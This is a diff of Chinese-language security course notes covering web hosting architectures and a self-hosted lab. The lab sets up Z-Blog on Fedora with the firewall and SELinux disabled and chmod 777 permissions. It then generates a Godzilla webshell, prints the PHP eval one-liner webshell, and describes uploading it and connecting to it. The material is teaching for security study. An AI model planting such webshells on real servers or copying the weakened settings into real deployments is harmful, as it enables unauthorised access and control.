@@ -40,28 +40,28 @@ Day02 基础入门-Web架构&前后端分离站&Docker容器&集成软件站&建
 
 #宝塔或Phpstudy
 -
-原理：打包类集成化环境，权限配置或受控制。  
+原理：打包类集成化环境，权限配置或受面板控制。  
 影响：攻击者权限对此区别  
 
 #建站分配站
 -
 原理：利用别人域名模板建立  
-影响：实质安全测试非目标资产  
+影响：实质安全测试非目标资产（本质上你测试的是建站平台的服务器）  
 举例：建站平台，凡科建站<https://jz.fkw.com/>  
 
 #静态Web
 -
-例子：Web前端设计  
+例子：Web前端设计（静态的html网页）  
 原理：数据没有传输性（js传输不算）  
-影响：无漏洞  
+影响：无任何漏洞  
 
 Tip：伪静态-动态转为静态技术
 -
->简单来说，就是让动态网页（通常是通过服务器端脚本语言生成内容、处理请求的网页，如基于 PHP、ASP.NET等开发的网页）在外观上呈现出静态网页（直接由 HTML 文件构成，内容相对固定，无需服务器端实时处理的网页）的形式，但其本质上依然是动态网页，只是通过一定的技术手段对 URL 进行了改写，使其看起来更像静态网页的 URL。
+>简单来说，就是让动态网页（通常是通过服务器端脚本语言生成内容、处理请求的网页，如基于 PHP、ASP.NET等开发的网页）在外观上呈现出静态网页（直接由 HTML 文件构成，内容相对固定，无需服务器端实时处理的网页）的形式，但其本质上依然是动态网页，只是通过一定的技术手段对 URL 进行改写，使其看起来更像静态网页。
 
 >其实现原理主要是借助服务器端的相关模块或配置，当用户访问改写后的伪静态 URL 时，服务器会根据预设的规则将该 URL 解析还原成对应的动态网页请求，然后按照正常的动态网页处理流程，如执行脚本代码、查询数据库等操作，生成相应的网页内容并返回给用户。例如，原本一个动态网页的 URL 可能是 “example.com/index.php?id=123”，经过伪静态处理后变成了 “example.com/article/123.html”，从形式上看更简洁、更符合搜索引擎友好以及用户友好的特点。
 
-实际模拟
+实战
 -
 在Windows Server 2012安装宝塔。  
 宝塔可以一键安装中间件，以及Web应用程序。
@@ -71,27 +71,22 @@ Tip：伪静态-动态转为静态技术
 ### 1.	安装Fedora Workstation  
 >https://fedoraproject.org/  
 >选择WORKSTATION版本    
-### 2.	开启ssh服务  
-```bash
-systemctl enable sshd
-systemctl start sshd
-```
-### 3.	安装所需的依赖。  
+### 2.	安装所需的依赖。  
 ```bash
 dnf -y install httpd httpd-devel mysql mysql-server php php-mysqlnd php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-json php-mbstring php-bcmath php-mhash php-intl
 ```
-### 4.	设置MySQL服务自启  
+### 3.	设置MySQL服务自启  
 ```bash 
 systemctl enable mysqld
 systemctl start mysqld
 ```
-### 5.	初始化MySQL  
+### 4.	初始化MySQL  
 ```bash
 mysql_secure_installation
 ```
 进行MySQL首次初始化，设置root密码
-### 6.	尝试登录MySQL```mysql -u root -p```
-### 7.	设置httpd服务或者nginx服务自启 二选一  
+### 5.	尝试登录MySQL```mysql -u root -p```
+### 6.	设置httpd服务或者nginx服务自启 二选一  
 ```bash 
 systemctl enable httpd
 systemctl start httpd
@@ -102,31 +97,31 @@ systemctl start httpd
 systemctl enable nginx
 systemctl start nginx
 ```
-### 8.	禁用防火墙  
+### 7.	禁用防火墙  
 ```bash
 systemctl disable firewalld
 systemctl stop firewalld
 ```
-### 9.	关闭SeLinux  
+### 8.	关闭SeLinux  
 ```bash
 vim /etc/selinux/config
 ```
 >SELINUX=设置为disabled
-### 10.	下载zblog源码并上传  
+### 9.	下载zblog源码并上传  
 >目录：/var/www/html
-### 11.	设置zblog文件夹权限  
+### 10.	设置zblog文件夹权限  
 ```bash
 chmod -R 777 /var/www/html/zblog
 ```
-### 12.	浏览器访问<http://ip:port/zblog/>
-### 13.	安装Zblog
+### 11.	浏览器访问<http://ip:port/zblog/>
+### 12.	安装Zblog
 >输入Zblog php安装程序所需的信息，包括数据库名（先提前创建所需的数据库），数据库端口、用户名和密码，还有后台管理系统用户名和密码，根据提示安装zblog。
-### 14.	大功告成！
-### 15.	运行木马生成器
+### 13.	大功告成！
+### 14.	运行木马生成器
 >下载ONE-FOX工具箱，运行哥斯拉v4.0.1
-### 16.	生成木马
+### 15.	生成木马
 >在哥斯拉v4.0.1，点击管理>生成 其他默认 有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.
-### 17.	一句话代码格式 
+### 16.	一句话代码格式 
 ```php 
 <?php @eval($_POST['cmd']); ?>
 ```
@@ -136,10 +131,10 @@ chmod -R 777 /var/www/html/zblog
 
 >$_POST['pass']：这是从 HTTP POST 请求中获取名为 “pass” 的变量值的方式。也就是说，攻击者会通过发送一个 POST 请求到包含这句代码的 PHP 文件所在的页面，并且在请求中携带名为 “pass” 的参数，其参数值就是攻击者想要执行的恶意 PHP 代码内容。
 
-### 18.	把php木马保存到你能找到的地方，并将其上传到服务器，在浏览器运行
-### 19.	点击目标 >添加 输入URL，有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.
-### 20.	点击测试连接，提示Success，然后点击添加
-### 21.	选中目标，右键进入，可以看到网站文件，但是看不到系统文件。 
+### 17.	把php木马保存到你能找到的地方，并将其上传到服务器，在浏览器运行
+### 18.	点击目标 >添加 输入URL，有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.
+### 19.	点击测试连接，提示Success，然后点击添加
+### 20.	选中目标，右键进入，可以看到网站文件，但是看不到系统文件。 
 
 Linux下终端全局代理
 -
